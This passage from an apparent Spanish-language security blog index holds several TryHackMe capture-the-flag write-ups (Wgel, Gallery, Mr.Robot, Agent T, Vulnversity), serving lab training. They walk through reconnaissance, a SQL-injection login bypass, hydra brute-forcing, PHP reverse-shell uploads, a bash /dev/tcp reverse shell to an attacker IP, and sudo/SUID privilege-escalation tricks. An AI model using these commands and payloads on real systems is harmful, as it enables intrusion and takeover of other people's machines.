Ubuntu Default Page: It works] Con ctrl + u podemos ver el código de la web en el cual se ve una línea comentada con un mensaje: \u0026lt;!-- Jessie don't forget to udate the webiste --\u0026gt; Con esto podemos intuir que hay un usuario llamado Jessie\nwfuzz y gobuster (subdirectorios) Con wfuzz vamos a buscar subdirectorios mediante un diccionario ubicado en /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt con el siguiente comando\n❯ wfuzz -c -t 200 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 10.10.176.77/FUZZ Nos reporta el subdirectorio /sitemap en el cual hay una web con muchos apartados. Con wfuzz otra vez, vamos a buscar subdirectorios sobre el directorio sitemap, mediante el mismo comando, pero cambiando la ubicación: de 10.10.176.77/FUZZ a 10.10.176.77/sitemap/FUZZ. No ha encontrado nada, probamos con gobuster y otro diccionario el cual está ubicado en /usr/share/wordlists/dirb/common.txt.\ngobuster dir -u http://10.10.176.77/sitemap/ -w /usr/share/wordlists/dirb/common.txt Infiltración Ahora nos reporta varios subdirectorios, entre ellos un .ssh, el cual contiene una rsa private key\nPara conectarnos por ssh la vamos a guardar en un archivo llamado id_rsa, y nos vamos a conectar con el usuario Jessie que encontramos anteriormente y la llave que encontramos\nchmod 600 id_rsa ssh -i id_rsa jessie@10.10.176.77 User Flag Podemos ver la flag en /home/jessie/Documents/user_flag.txt.\nRoot Flag Con un sudo -l podemos ver que podemos ejecutar wget como root sin proporcionar contraseña. En https://gtfobins.github.io/gtfobins/wget/#shell Podemos ver que hay una forma de leer archivos aprovechándonos del wget . Intuyendo que la flag está en /root/root_flag.txt, con los siguientes comandos deberíamos de poder leerlo\nLFILE=/root/root_flag.txt wget -i $LFILE Ya tenemos la flag!!!\n","date":"2022-12-28","id":78,"permalink":"/writeups/tryhackme/wgel/","summary":"https://tryhackme.com/room/wgelctf\nIP Atacante = 10.10.10.10\nIP víctima = 10.10.176.77\nReconocimiento Para empezar lo primero es comprobar si la máquina está activa y que OS tiene","tags":["CTF","Fácil","Linux","wget"],"title":"Wgel"},{"content":"","date":"2022-12-28","id":79,"permalink":"/tags/wget/","summary":"","tags":[],"title":"wget"},{"content":"https://tryhackme.com/room/gallery666\nIP Atacante = 10.10.10.10\nIP víctima = 10.10.250.47\nReconocimiento Para empezar lo primero es comprobar si la máquina está activa y que OS tiene\n❯ ping -c 1 10.10.250.47 PING 10.10.250.47 (10.10.250.47) 56(84) bytes of data. 64 bytes from 10.10.250.47: icmp_seq=1 ttl=63 time=52.3 ms --- 10.10.250.47 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 52.300/52.300/52.300/0.000 ms En este caso da un ttl (time to live) de 63, entendiendo que ttl=64: Linux / ttl=128: Windows. Esta máquina es Linux por aproximación\nEscaneo de puertos (nmap) Ahora empezamos con un escaneo de puertos\n❯ sudo nmap -p- --open -sS --min-rate 5000 -Pn -vvv -n 10.10.110.190 -oG allPorts Parámetro Función -p- Para que el escaneo sea a todos los puertos (65536) \u0026ndash;open Para que solo reporte los puertos abiertos -sS \u0026ndash;min-rate 5000 Definir el tiempo del escaneo -n Omitir resolución DNS -vvv Para que vaya reportando lo que encuentre por consola -Pn Skip host discovery -oG allPorts Para que guarde el escaneo en format grepeable en un archivo llamado allPort Con una función definida en la zshrc llamada extractPorts, nos reporta los puertos abiertos de una forma más visual\nFunción extractPorts de @s4vitar\n❯ extractPorts allPorts ───────┬───────────────────────────────────────────────────────────────────────────────────────── │ File: extractPorts.tmp ───────┼───────────────────────────────────────────────────────────────────────────────────────── 1 │ 2 │ [*] Extracting information... 3 │ 4 │ [*] IP Address: 10.10.110.190 5 │ [*] Open ports: 80,8080 6 │ 7 │ [*] Ports copied to clipboard 8 │ ───────┴───────────────────────────────────────────────────────────────────────────────────────── Ahora con nmap vamos a intentar buscar las versiones de los servicios de los puertos y ejecutar scripts básicos de reconocimientos\n❯ nmap -p80,8080 -sC -sV 10.10.110.190 -oN target PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Apache2 Ubuntu Default Page: It works 8080/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) | http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set |_http-title: Simple Image Gallery System | http-open-proxy: Potentially OPEN proxy. |_Methods supported:CONNECTION Parámetro Función -p Especificamos los puertos abiertos que hemos encontrado con el escaneo anterior -sC Para que realice scripts básicos de reconocimiento -sV Proporciona la versión e información de los servicios que corren por los puertos Web Con el whatweb podemos ver más información de la web\n❯ whatweb 10.10.110.190 http://10.10.110.190 [200 OK] Apache[2.4.29], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.110.190], Title[Apache2 Ubuntu Default Page: It works] Buscando subdirectorios Con wfuzz vamos a fuzzear mediante el dicionario /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt para encontrar subdirectorios\nwfuzz -c -t 200 --hc=404 --hh=42126 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 10.10.151.26/FUZZ Nos reporta el directorio /gallery\n/gallery Al entrar nos lleva a /gallery/login.php y vemos un panel para iniciar sessión, primero comprobamos si admin:admin funciona, pero no. Podemos probar con usuario ' or 1 = 1-- - y cualquier contraseña y ya nos entra\nAdmin Ahora estamos dentro de la cuenta de administrador y podemos ver los álbums, Al entrar dentro de uno vemos que nos deja subir fotos nuevas.\nAl probar de subir un .php no lo acepta, con burpsuite he probado con un diccionario de extensiones y solo acepta extensiones de fotos\nDentro de la configuración del perfil del admin, hay un apartado para cambiar la foto. El mensaje, dice, selecciona un archivo. Podemos intentar mandarle un archivo .php para mandarnos una reverse shell\nIntrusión Vamos a intentar subir un archivo php de pentestmonkey para la reverse shell: https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php.\nEs importante cambiar las líneas de ip y port y poner la ip de nuestra máquina y el puerto por el que nos vamos a poner en escucha con netcat (443)\nAhora ya podemos subir el archivo y al darle a update, recibimos a reverse shell\nEscalada de privilegios Tratamiento de la tty Antes para trabajar mejor vamos a hacer un tratamiento de la terminal con los siguientes comandos:\nscript /dev/null -c bash ctrl + z\nstty raw -echo; fg reset xterm export SHELL=bash export TERM=xterm Mike Si vamos a /home/mike podemos ver que hay un archivo llamado user.txt el cual debe contener la flag de usuario, Pero no tenemos permisos para leerlo ni para entrar en la carpeta Documents e Images.\nDespués de estar un rato buscando he encontrado que en /var/backups hay una carpeta llamada mike_home_backup en la cual están los archivos de mike y tenemos permisos para leerlos.\nDentro de Documents hay un archivo con 3 contraseñas de otras webs con el usuario mike, he probado si alguna de estas sirve para esta máquina pero no.\nEn Images, hay 3 fotos las cuales he mirado si tenían algún archivo oculto pero no\nCon un ls -a podemos ver que hay un historial .bash_historycon un cat podemos ver su contenido, dentro hay un comando en el que parece especificar una contraseña: sudo -lb3stpassw0rdbr0xx con el comando su mike y proporcionando la contraseña b3stpassw0rdbr0xx ya somos mike\nYa podemos ver la flag\nRoot Con sudo -l Podemos ver que puede ejecutar lo siguiente como root sin contraseña /bin/bash /opt/rootkit.sh\nAl ejecutar sudo /bin/bash /opt/rootkit.sh y le damos a read nos abre un archivo con un texto muy largo. Como estamos ejecutando nano como root podemos probar con ctrl + r, ctrl + x y escribiendo reset; sh 1\u0026gt;\u0026amp;0 2\u0026gt;\u0026amp;0, ya somos root\n","date":"2022-12-21","id":80,"permalink":"/writeups/tryhackme/gallery/","summary":"https://tryhackme.com/room/gallery666\nIP Atacante = 10.10.10.10\nIP víctima = 10.10.250.47\nReconocimiento Para empezar lo primero es comprobar si la máquina está activa y que OS tiene","tags":["CTF","Fácil","Linux","sqli","file upload"],"title":"Gallery"},{"content":"","date":"2022-12-20","id":81,"permalink":"/tags/fuerza-bruta/","summary":"","tags":[],"title":"Fuerza bruta"},{"content":"","date":"2022-12-20","id":82,"permalink":"/tags/hash-raw-md5/","summary":"","tags":[],"title":"hash raw-md5"},{"content":"https://tryhackme.com/room/mrrobot\nIP Atacante = 10.10.10.10\nIP víctima = 10.10.193.138\nReconocimiento Para empezar lo primero es comprobar si la máquina está activa y que OS tiene\n❯ ping -c 1 10.10.193.138 PING 10.10.193.138 (10.10.193.138) 56(84) bytes of data. 64 bytes from 10.10.193.138: icmp_seq=1 ttl=63 time=56.6 ms --- 10.10.193.138 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 56.631/56.631/56.631/0.000 ms En este caso da un ttl (time to live) de 63, entendiendo que ttl=64: Linux / ttl=128: Windows. Esta máquina es Linux por aproximación\nEscaneo de puertos (nmap) Ahora empezamos con un escaneo de puertos\n❯ sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.193.138 -oG allPort Parámetro Función -p- Para que el escaneo sea a todos los puertos (65536) \u0026ndash;open Para que solo reporte los puertos abiertos -sS \u0026ndash;min-rate 5000 Definir el tiempo del escaneo -n Omitir resolución DNS -vvv Para que vaya reportando lo que encuentre por consola -Pn Skip host discovery -oG allPorts Para que guarde el escaneo en format grepeable en un archivo llamado allPort Con una función definida en la zshrc llamada extractPorts, nos reporta los puertos abiertos de una forma más visual\nFunción extractPorts de @s4vitar\n❯ extractPorts allPorts ───────┬───────────────────────────────────────────────────────────────────────────────────────── │ File: extractPorts.tmp ───────┼───────────────────────────────────────────────────────────────────────────────────────── 1 │ 2 │ [*] Extracting information... 3 │ 4 │ [*] IP Address: 10.10.46.125 5 │ [*] Open ports: 80,443 6 │ 7 │ [*] Ports copied to clipboard 8 │ ───────┴───────────────────────────────────────────────────────────────────────────────────────── Ahora con nmap vamos a intentar buscar las versiones de los servicios de los puertos y ejecutar scripts básicos de reconocimientos\n❯ nmap -p80,443 -sV -sC 10.10.193.138 -oN target PORT STATE SERVICE VERSION 80/tcp open http Apache httpd |_http-title: Site doesn\u0026#39;t have a title (text/html). |_http-server-header: Apache 443/tcp open ssl/http Apache httpd |_http-server-header: Apache |_http-title: Site doesn\u0026#39;t have a title (text/html). | ssl-cert: Subject: commonName=www.example.com | Not valid before: 2015-09-16T10:45:03 |_Not valid after: 2025-09-13T10:45:03 Web Con el whatweb podemos ver mas información sobre la web\n❯ whatweb 10.10.193.138 http://10.10.193.138 [200 OK] Apache, Country[RESERVED][ZZ], HTML5, HTTPServer[Apache], IP[10.10.193.138], Script, UncommonHeaders[x-mod-pagespeed], X-Frame-Options[SAMEORIGIN] Al entrar a la web vemos una animación que simula el arranque de un Linux, quando termina muestra el siguiente mensaje\nMas abajo vemos una \u0026ldquo;terminal\u0026rdquo; en la cual solo se pueden usar los comandos que salen arriba\nTodos los comandos muestran videos, fotos y mensajes relacionados con la serie\u0026hellip;\nBuscando subdirectorios Para ver si hay subdirectorios vamos a usar la herramienta gpbuster para fusear mediante un diccionario que está en /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt con el siguiente comando:\n❯ gobuster dir -u http://10.10.46.125 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt =============================================================== 2022/12/19 21:57:53 Starting gobuster in directory enumeration mode =============================================================== /images (Status: 301) [Size: 236] [--\u0026gt; http://10.10.193.138/images/] /blog (Status: 301) [Size: 234] [--\u0026gt; http://10.10.193.138/blog/] /rss (Status: 301) [Size: 0] [--\u0026gt; http://10.10.193.138/feed/] /sitemap (Status: 200) [Size: 0] /login (Status: 302) [Size: 0] [--\u0026gt; http://10.10.193.138/wp-login.php] /0 (Status: 301) [Size: 0] [--\u0026gt; http://10.10.193.138/0/] /feed (Status: 301) [Size: 0] [--\u0026gt; http://10.10.193.138/feed/] /video (Status: 301) [Size: 235] [--\u0026gt; http://10.10.193.138/video/] /image (Status: 301) [Size: 0] [--\u0026gt; http://10.10.193.138/image/] /atom (Status: 301) [Size: 0] [--\u0026gt; http://10.10.193.138/feed/atom/] /wp-content (Status: 301) [Size: 240] [--\u0026gt; http://10.10.193.138/wp-content/] /admin (Status: 301) [Size: 235] [--\u0026gt; http://10.10.193.138/admin/] /audio (Status: 301) [Size: 235] [--\u0026gt; http://10.10.193.138/audio/] /intro (Status: 200) [Size: 516314] /wp-login (Status: 200) [Size: 2613] /css (Status: 301) [Size: 233] [--\u0026gt; http://10.10.193.138/css/] /rss2 (Status: 301) [Size: 0] [--\u0026gt; http://10.10.193.138/feed/] /license (Status: 200) [Size: 309] /wp-includes (Status: 301) [Size: 241] [--\u0026gt; http://10.10.193.138/wp-includes/] /js (Status: 301) [Size: 232] [--\u0026gt; http://10.10.193.138/js/] /Image (Status: 301) [Size: 0] [--\u0026gt; http://10.10.193.138/Image/] /rdf (Status: 301) [Size: 0] [--\u0026gt; http://10.10.193.138/feed/rdf/] /page1 (Status: 301) [Size: 0] [--\u0026gt; http://10.10.193.138/] /readme (Status: 200) [Size: 64] /robots (Status: 200) [Size: 41] /dashboard (Status: 302) [Size: 0] [--\u0026gt; http://10.10.193.138/wp-admin/] Nos reporta muchos subdirectorios, despues de ir probando uno por uno, e visto 2 que son importantes\n/robots/ Contenido del /robots/\nUser-agent: * fsocity.dic key-1-of-3.txt Ya tenemos la primera key\n❯ curl http://10.10.193.138/key-1-of-3.txt ---------- key 1 ---------- En el robots también indica otro archivo fsocity.dic, con wget nos lo podemos passar a nuestra máquina\n❯ wget http://10.10.193.138/fsocity.dic Es un dicionario con 858160 palabras\n/wp-admin/ En wp-admin hay un panel de login de WordPress, probamos con las típicas credenciales admin:admin, no funcionan pero hay un pequeño detalle importante\nEn vez de decir que las credenciales són incorrectas, especifica que es lo que esta mal, aprovechando esto podemos usar un diccionario de usuarios hasta que no de ese error y despues con las contraseñas\nIntrusion Con hydra vamos a probar con los usuarios de el dicionario que nos descargamos de /fsocity.dic/ con la contraseña test\n❯ hydra -L fsocity.dic -p test 10.10.193.138 http-post-form \u0026#34;/wp-login.php:log=^USER^\u0026amp;pwd=^PWD^:Invalid username\u0026#34; -t 30 [80][http-post-form] host: 10.10.193.138 login: Elliot password: test Ya tenemos un usuario (Elliot), ahora con hydra también vamos a probar contraseñas con el dicionario rockyou.txt\n❯ hydra -l Elliot -P fsocity.dic 10.10.33.39 http-post-form \u0026#34;/wp-login.php:log=^USER^\u0026amp;pwd=^PWD^:The password you entered for the username Elliot is incorrect\u0026#34; -t 30 [80][http-post-form] host: 10.10.193.138 login: Elliot password: ER28-0652 Con estas credenciales ya podemos iniciar session en la web, eso nos lleva al panel de administración de la web\nAhora el objetivo seria encontrar algún sitio en el que poder subir archivos, para mandar un php malicioso que nos envié una reverse shell\nEn el apartado de posts podemos subir o escribir archivos pero se quedan en texto plano\nEn el media podemos subir archivos.\nPero después de comprobarlo con el burpsuite como en la maquina Vulnversity solo acepta archivos con extensiones de fotos.\nDentro del apartado de apariencia, en el editor podemos ver que salen los archivos php de la web, los cuales podemos editar.\nPor ejemplo vamos a abrir el 404.php y vamos a sustituir lo que había por el código de la reverse shell, es importante cambiar el puerto por el que nos ponemos en escucha y la ip de nuestra maquina\nAhora nos ponemos en escucha por el puerto 443\nnc -nlvp 443 Ahora al poner un subdirectorio random http://10.10.193.138/okjihogyklasd ejecuta el 404.php y recibimos la conexión.\nEscalada de privilegios En el directorio /home/robot esta la segunda flag, también hay un archivo con un hash raw-md5\n❯ john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt Loaded 1 password hash (Raw-MD5 [MD5 512/512 AVX512BW 16x3]) censored password (?) Ahora al intentar convertirnos en robot sale este error\n$ su robot su: must be run from a terminal Con python -c 'import pty; pty.spawn(\u0026quot;/bin/bash\u0026quot;)' se soluciona el problema\ndaemon@linux:/$ python -c \u0026#39;import pty; pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39; python -c \u0026#39;import pty; pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39; daemon@linux:/$ su robot su robot Password: abcdefghijklmnopqrstuvwxyz robot@linux:/$ Ahora con find / -perm -4000 -exec ls -ldb {} \\; 2\u0026gt;/dev/null, ay un que no deveria de estar ahi, nmap\nnmap --interactive Eso abre el nmap en modo interactive, como se esta ejecutando como root, si hacemos !sh para spawnear una sh, ya somos root, podemos ver la ultima flag en /root\n","date":"2022-12-20","id":83,"permalink":"/writeups/tryhackme/mr.robot/","summary":"https://tryhackme.com/room/mrrobot\nIP Atacante = 10.10.10.10\nIP víctima = 10.10.193.138\nReconocimiento Para empezar lo primero es comprobar si la máquina está activa y que OS tiene","tags":["CTF","Mediana","Linux","Fuerza bruta","hash raw-md5","php","nmap"],"title":"Mr.Robot"},{"content":"","date":"2022-12-20","id":84,"permalink":"/tags/nmap/","summary":"","tags":[],"title":"nmap"},{"content":"","date":"2022-12-20","id":85,"permalink":"/tags/php/","summary":"","tags":[],"title":"php"},{"content":"https://tryhackme.com/room/agentt\nIP Atacante = 10.10.10.10\nIP víctima = 10.10.175.238\nReconocimiento Para empezar lo primero es comprobar si la máquina está activa y que OS tiene\n❯ ping -c 1 10.10.175.238 PING 10.10.175.238 (10.10.175.238) 56(84) bytes of data. 64 bytes from 10.10.175.238: icmp_seq=1 ttl=63 time=47.7 ms --- 10.10.175.238 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 47.680/47.680/47.680/0.000 ms En este caso da un ttl (time to live) de 63, entendiendo que ttl=64: Linux / ttl=128: Windows. Esta máquina es Linux por aproximación\nEscaneo de puertos (nmap) Ahora empezamos con un escaneo de puertos\n❯ sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.175.238 -oG allPort Parámetro Función -p- Para que el escaneo sea a todos los puertos (65536) \u0026ndash;open Para que solo reporte los puertos abiertos -sS \u0026ndash;min-rate 5000 Definir el tiempo del escaneo -n Omitir resolución DNS -vvv Para que vaya reportando lo que encuentre por consola -Pn Skip host discovery -oG allPorts Para que guarde el escaneo en format grepeable en un archivo llamado allPort Con una función definida en la zshrc llamada extractPorts, nos reporta los puertos abiertos de una forma más visual\nFunción extractPorts de @s4vitar\n❯ extractPorts allPorts ───────┬───────────────────────────────────────────────────────────────────────────────────────── │ File: extractPorts.tmp ───────┼───────────────────────────────────────────────────────────────────────────────────────── 1 │ 2 │ [*] Extracting information... 3 │ 4 │ [*] IP Address: 10.10.175.238 5 │ [*] Open ports: 80 6 │ 7 │ [*] Ports copied to clipboard 8 │ ───────┴───────────────────────────────────────────────────────────────────────────────────────── Ahora con nmap vamos a intentar buscar las versiones de los servicios de los puertos y ejecutar scripts básicos de reconocimientos\n❯ nmap -p80 -sC -sV 10.10.175.238 -oN target PORT STATE SERVICE VERSION 80/tcp open http PHP cli server 5.5 or later (PHP 8.1.0-dev) |_http-title: Admin Dashboard Infiltración Con searchsploit podemos comprobar si la version de php es vulnerable\n❯ searchsploit PHP 8.1.0-dev -------------------------------------------------------- --------------------------------- Exploit Title | Path -------------------------------------------------------- --------------------------------- PHP 8.1.0-dev - \u0026#39;User-Agentt\u0026#39; Remote Code Execution | php/webapps/49933.py -------------------------------------------------------- --------------------------------- Hay un exploit de remote code execution, con searchsploit -m 49933 nos lo podemos pasar a nuestra máquina.\n❯ python3 49933.py Enter the full host url: http://10.10.175.238 Interactive shell is opened on http://10.10.175.238 Can\u0026#39;t acces tty; job crontol turned off. $ whoami root Ya tenemos una shell interactiva como root, pero no podemos salir del directorio /var/www/html, vamos a intentar crear una reverse shell.\nNos ponemos en escucha por el puerto 443\nnc -nlvp 443 Intentamos mandarnos la reverse shell con bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.10.10/443 0\u0026gt;\u0026amp;1, pero no recibimos nada, probamos con bash -c \u0026quot;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.10.10/443 0\u0026gt;\u0026amp;1\u0026quot; ahora si, ya podemos ver la flag que está en /flag.txt\n","date":"2022-12-19","id":86,"permalink":"/writeups/tryhackme/agent-t/","summary":"https://tryhackme.com/room/agentt\nIP Atacante = 10.10.10.10\nIP víctima = 10.10.175.238\nReconocimiento Para empezar lo primero es comprobar si la máquina está activa y que OS tiene","tags":["CTF","Fácil","php"],"title":"Agent T"},{"content":"Aprende sobre el reconocimiento activo, los ataques a aplicaciones web y la escalada de privilegios.\nhttps://tryhackme.com/room/vulnversity\nIP Atacante = 10.10.10.10\nIP víctima = 10.10.23.174\nReconocimiento Para la fase de Reconocimiento vamos a usar nmap.\n¿Qué es nmap?\nnmap es una herramienta potente, gratuita y de código abierto que se utiliza para descubrir hosts y servicios en una red informática. En nuestro ejemplo, usamos nmap para escanear esta máquina e identificar todos los servicios que se ejecutan en un puerto en particular. nmap tiene muchas capacidades, a continuación hay una tabla que resume algunas de las funciones que proporciona.\nParámetros típicos nmap:\nParámetro Función -p- Para que el escaneo sea a todos los puertos (65536) -p\u0026rsquo;port' Escanear unos puertos en específico \u0026ndash;open Para que solo reporte los puertos abiertos -sS \u0026ndash;min-rate 5000 Definir el tiempo del escaneo -n Omitir resolución DNS -vvv Para que vaya reportando lo que encuentre por consola -Pn Skip host discovery -oG archivo Para que guarde el escaneo en format grepeable en un archivo llamado archivo -sC Para que realice scripts básicos de reconocimiento -sV Proporciona la versión e información de los servicios que corren por los puertos Escanea la máquina, ¿cuántos puertos están abiertos? ❯ nmap -p- 10.10.23.174 PORT STATE SERVICE 21/tcp open ftp 22/tcp open ssh 139/tcp open netbios-ssn 445/tcp open microsoft-ds 3128/tcp open squid-http 3333/tcp open dec-notes Tiene un total de 6 puertos abiertos\n¿Qué versión del proxy se está ejecutando en la máquina? ❯ nmap -p21,22,139,445,3128,3333 -sV 10.10.23.174 PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0) 139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 445/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 3128/tcp open http-proxy Squid http proxy 3.5.12 3333/tcp open http Apache httpd 2.4.18 ((Ubuntu)) Service Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel En el puerto 3128 se puede ver la version de la proxy 3.5.12\n¿Cuántos puertos escaneará nmap si se usó la bandera -p-400? Como se indica en el parámetro (-p-400), Escaneara 400 puertos\nUsando el indicador nmap -n, ¿qué no resolverá? Con él -n no hacer DNS\n¿Cuál es el sistema operativo más probable que esté ejecutando esta máquina? ❯ nmap -p21,22,139,445,3128,3333 -sV 10.10.23.174 PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0) 139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 445/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 3128/tcp open http-proxy Squid http proxy 3.5.12 3333/tcp open http Apache httpd 2.4.18 ((Ubuntu)) Service Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel En el puerto 3333 indica que es un Ubuntu\n¿En qué puerto se está ejecutando el servidor web? ❯ nmap -p21,22,139,445,3128,3333 -sV 10.10.23.174 PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0) 139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 445/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 3128/tcp open http-proxy Squid http proxy 3.5.12 3333/tcp open http Apache httpd 2.4.18 ((Ubuntu)) Service Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel El servidor web se está ejecutando por el puerto 3333\nLocalizando subdirectorios Para esta parte vamos a buscar directorios con gobuster y wfuzz usando el diccionario /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\n¿Cuál es el directorio que tiene una página de formulario de carga? GoBuster GoBuster es una herramienta utilizada para la fuerza bruta de URI (directorios y archivos), subdominios DNS y nombres de host virtual. Para esta máquina, nos centraremos en usarla para directorios de fuerza bruta.\nParámetro Función -e Imprima las URL completas en su consola -u La URL de destino -w Ruta a tu diccionario -U y -P Nombre de usuario y contraseña para autenticación básica -p\u0026rsquo;x' Proxy a utilizar para las solicitudes -c \u0026lsquo;http cookies\u0026rsquo; Especifique una cookie para simular su autenticación ❯ gobuster dir -u http://10.10.23.174:3333 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt =============================================================== 2022/12/18 01:37:49 Starting gobuster in directory enumeration mode =============================================================== /images (Status: 301) [Size: 320] [--\u0026gt; http://10.10.23.174:3333/images/] /css (Status: 301) [Size: 317] [--\u0026gt; http://10.10.23.174:3333/css/] /js (Status: 301) [Size: 316] [--\u0026gt; http://10.10.23.174:3333/js/] /fonts (Status: 301) [Size: 319] [--\u0026gt; http://10.10.23.174:3333/fonts/] /internal (Status: 301) [Size: 322] [--\u0026gt; http://10.10.23.174:3333/internal/] Probando desde un navegador los directorios que reporto, el directorio en el que se pueden subir archivos es: internal\nwfuzz Wfuzz fue creado para facilitar la tarea en las evaluaciones contra aplicaciones web, y está basado en un concepto simple; reemplaza cualquier referencia a la palabra clave FUZZ, por el valor del payload (carga útil) definido.\nUn payload en Wfuzz es una fuente de datos.\nEste concepto simple permite cualquier entrada sea inyectada en cualquier campo de una petición HTTP, permitiendo realizar ataques complejos de seguridad web en diferentes componentes de la aplicación web, como parámetros, formularios, directorios/archivos, cabeceras, etc.\nFuente\nParámetro Función -c Para que lo reporte todo con colores -t Para configurar el tiempo \u0026ndash;hc=404 Para que no reporte los subdirectorios que no existan -w Es donde se indica el diccionario FUZZ Se escribe donde quieres aplicar el diccionario ❯ wfuzz -c -t 200 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.23.174:3333/FUZZ ===================================================================== ID Response Lines Word Chars Payload ===================================================================== 000000550: 301 9 L 28 W 317 Ch \u0026#34;css\u0026#34; 000000953: 301 9 L 28 W 316 Ch \u0026#34;js\u0026#34; 000002771: 301 9 L 28 W 319 Ch \u0026#34;fonts\u0026#34; 000002984: 301 9 L 28 W 322 Ch \u0026#34;internal\u0026#34; 000095524: 403 11 L 32 W 302 Ch \u0026#34;server-status\u0026#34; Probando desde un navegador los directorios que reporto, el directorio en el que se pueden subir archivos es: internal\nComprometer el servidor web ¿Qué tipo de archivo común, que le gustaría cargar para explotar el servidor, está bloqueado? Prueba un par para averiguarlo. La respuesta es .php\n¿Qué extensión está permitida? Para identificar qué extensiones no están bloqueadas, vamos a fuzzear el formulario de carga. Para hacer esto, vamos a usar BurpSuite.\nPrimero vamos a capturar la petición, enviarlo al intruder y definir la extensión como una variable\nEn el apartado de payloads vamos a definir las extensiones que queremos que pruebe\nAhora ya le podemos dar a attack.\nSi nos fijamos en la columna de length podemos ver que en todas sale lo mismo menos una. Eso significa que con él .phtml no nos ha devuelto el mismo mensaje, se puede suponer que lo ha aceptado\n¿Cuál es el nombre del usuario que administra el servidor web? Viendo que podemos subir .phtml vamos a mandarle un archivo para crear una reverse shell, vamos a usar https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php de pentestmonkey\n# Nos lo pasamos a nuestra máquina wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php # Le cambiamos la extensión mv php-reverse-shell.php php-reverse-shell.phtml Importante cambiar estas líneas\n$ip = \u0026#39;127.0.0.1\u0026#39;; // Ip de tú máquina $port = 1234; // Puerto en el que te vas a poner en escucha Nos ponemos en escucha por el puerto 443 con netcat\nnc -nlvp 443 Ahora ya podemos ejecutar el archivo poniendo lo siguiente en el navegador\nhttp://10.10.23.174:3333/internal/uploads/php-reverse-shell.phtml\nAntes para trabajar mejor vamos a hacer un tratamiento de la terminal con los siguientes comandos:\nscript /dev/null -c bash ctrl + z\nstty raw -echo; fg reset xterm export SHELL=bash export TERM=xterm Ahora en /home/bill/user.txt ya podemos ver la flag y ya sabemos que el nombre de quien administra el servidor web es bill\nEscalada de privilegios En Linux, SUID (establecer el ID de usuario del propietario en la ejecución) es un tipo especial de permiso de archivo otorgado a un archivo. SUID otorga permisos temporales a un usuario para ejecutar el programa/archivo con el permiso del propietario del archivo (en lugar del usuario que lo ejecuta).\nPor ejemplo, el archivo binario para cambiar su contraseña tiene el bit SUID (/usr/bin/passwd). Esto se debe a que para cambiar su contraseña, deberá escribir en el archivo shadowers al que no tiene acceso, root sí, por lo que tiene privilegios de root para realizar los cambios correctos.\nEn el sistema, busque todos los archivos SUID. ¿Qué archivo se destaca? Con find / -perm -4000 -exec ls -ldb {} \\; 2\u0026gt;/dev/null podemos ver los archivos con permisos suid. La respuesta es /bin/systemctl\nConviértase en root y obtenga la última flag (/root/root.txt) Ejecutando lo siguiente y después haciendo un cat a /tmp/output podemos ver la flag\nTF=$(mktemp).service echo \u0026#39;[Service] Type=oneshot ExecStart=/bin/sh -c \u0026#34;cat /root/root.txt \u0026gt; /tmp/output\u0026#34; [Install] WantedBy=multi-user.target\u0026#39; \u0026gt; $TF /bin/systemctl link $TF /bin/systemctl enable --now $TF cat /tmp/output ","date":"2022-12-18","id":87,"permalink":"/writeups/tryhackme/vulnversity/","summary":"Aprende sobre el reconocimiento activo, los ataques a aplicaciones web y la escalada de privilegios.\nhttps://tryhackme.com/room/vulnversity\nIP Atacante = 